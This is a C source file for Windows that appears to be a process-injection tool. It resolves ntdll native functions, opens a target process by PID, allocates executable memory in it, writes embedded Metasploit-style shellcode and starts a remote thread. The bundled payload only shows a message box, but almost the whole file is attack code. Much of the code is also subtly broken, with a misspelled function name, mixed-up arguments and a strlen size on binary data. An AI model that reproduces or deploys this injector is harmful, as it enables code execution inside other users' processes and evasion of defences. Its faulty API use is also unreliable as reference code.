#include <stdio.h>
#include <Windows.h>
#include "uuu.h"
#include <winternl.h>

DWORD PID = NULL;

#define k(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define w(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)
#define i(msg, ...) printf("[i] " msg "\n", ##__VA_ARGS__)

HANDLE h;

HMODULE getMod(LPCWSTR modName) {

    HMODULE hModule = NULL;
    i("trying to get a handle to %S", modName);

    hModule = GetModuleHandleW(modName);

    if (hModule == NULL) {
        w("failed to get a handle to the module. error: 0x%lx\n", GetLastError());
        return NULL;
    }

    else {
        k("got a handle to the module!");
        i("\\___[ %S\n\t\\_0x%p]\n", modName, hModule);
        return hModule;
    }

}
unsigned char Buf[] = { 0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,
0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,0x8b,
0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,
0x3e,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,
0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,0x48,0x8b,0x52,0x20,
0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,0x00,
0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,
0x8b,0x48,0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,
0x5c,0x48,0xff,0xc9,0x3e,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,0x08,
0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,
0x01,0xd0,0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,
0x1c,0x49,0x01,0xd0,0x3e,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,
0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,
0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,
0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x3e,
0x48,0x8d,0x8d,0x26,0x01,0x00,0x00,0x41,0xba,0x4c,0x77,0x26,
0x07,0xff,0xd5,0x49,0xc7,0xc1,0x00,0x00,0x00,0x00,0x3e,0x48,
0x8d,0x95,0x0e,0x01,0x00,0x00,0x3e,0x4c,0x8d,0x85,0x1f,0x01,
0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,
0x48,0x65,0x6c,0x6c,0x6f,0x2c,0x20,0x66,0x72,0x6f,0x6d,0x20,
0x4d,0x53,0x46,0x21,0x00,0x45,0x72,0x72,0x6f,0x72,0x21,0x00,
0x75,0x73,0x65,0x72,0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00 };




int main(int argc, char* argv[]) {

    NTSTATUS status = NULL;
    PVOID rBuffer = NULL;
    HANDLE hProc = NULL;
    HANDLE hThread = NULL;
    HMODULE hNTDLL = NULL;


    hNTDLL = GetModuleHandleA("ntdll.dll");
    const NtOpenProcess _NtOpenProcess = (NtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProces");
    const NtWriteVirtualMemory _NtWriteVirtualMemory = (NtWriteVirtualMemory)GetProcAddress(hNTDLL,
        "NtWriteVirtualMemory");
    const NtAllocateVirtualMemory _NtAllocateVirtualMemory = (NtAllocateVirtualMemory)GetProcAddress(hNTDLL,
        "NtAllocateVirtualMemory");
    const NtCreateThreadEx _NtCreateThreadEx = (NtCreateThreadEx)GetProcAddress(hNTDLL,
        "NtCreateThreadEx");
    const NtClose _NtClose = (NtClose)GetProcAddress(hNTDLL,
        "NtClose");

    int s = strlen((char*)Buf);
  if (argc < 2) {

      w(" usage: %s [PID]",argv[0]);
      return EXIT_FAILURE;
  }

    if (!_NtOpenProcess || !_NtWriteVirtualMemory || !_NtAllocateVirtualMemory || !_NtCreateThreadEx) {
        w("Failed to load necessary functions.");
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]);
    OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL};
    CLIENT_ID CID = { (HANDLE)PID, NULL};


    status = NtOpenProcess(&hProc,PROCESS_ALL_ACCESS,&OA, &CID);


    i(" getting proc handle...");
    if(status != STATUS_SUCCESS) {
        w("failed to get handle on process. 0x%x", status);
        goto CLEANUP;
    }

    k(" process gotten!");
    status = NtAllocateVirtualMemory(&hProc, &Buf, s,0x00001000,0x40 );

    // h, IntPtr.Zero, 0,Buf.Length, 0x00001000, 0x40


i(" allocating... ");

    if(status != STATUS_SUCCESS) {
        w("failed to allocate virtual memory. 0x%x", status);
        goto CLEANUP;
    }
    k("allocated memory!");
  status = NtWriteVirtualMemory(&hProc,&hProc,&Buf,s,NULL);

    //h, memAlloc , 0, Buf, (uint)(Buf.Length), out outout
    i("writing v mem");

    if(status != STATUS_SUCCESS) {
        w("failed to write virtual memory. 0x%x", status);
        goto CLEANUP;
    }
    k("wrote memory!");

hThread = NtCreateThreadEx(s,&Buf, NULL,(PTHREAD_START_ROUTINE)hProc, NULL, 0, 0,0,0,NULL);



    return EXIT_SUCCESS;



CLEANUP:

    if (hThread) {
            i("closing handle to thread");
            CloseHandle(hThread);
        }
    if (hProc) {
        i("closing handle to process");
        CloseHandle(hProc);
    }

    k("finished with the cleanup, exiting now. goodbye :>");
    return EXIT_SUCCESS;

}

